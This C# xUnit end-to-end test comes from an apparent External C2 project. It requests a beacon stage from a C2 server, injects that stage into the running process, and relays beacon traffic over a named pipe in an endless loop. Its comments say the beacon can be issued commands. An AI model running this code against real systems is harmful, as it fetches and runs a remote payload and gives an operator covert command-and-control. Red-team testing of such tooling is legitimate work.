using System;
using System.Net;
using System.Threading.Tasks;

using Xunit;

namespace ExternalC2.UnitTests
{
    public class EndToEndTests
    {
        // doesn't assert a result, but you should see the beacon checking in constantly in the GUI
        // you can also issue it commands and get the responses
        [Fact]
        public async Task RelayFrames()
        {
            var serverController = new Controller.BeaconController();
            serverController.Configure(IPAddress.Parse(Constants.Server), Constants.Port, Constants.Block);
            await serverController.Connect();
            
            var pipeName = Guid.NewGuid().ToString();
            var stage = await serverController.RequestStage(pipeName, Base.Architecture.x64);

            var clientController = new Client.BeaconController();
            clientController.Configure(pipeName);
            clientController.InjectStage(stage);
            await clientController.Connect();

            while (true)
            {
                var beaconFrame = await clientController.ReadFrame();
                await serverController.WriteFrame(beaconFrame);
            
                var serverFrame = await serverController.ReadFrame();
                await clientController.WriteFrame(serverFrame);
            }
        }
    }
}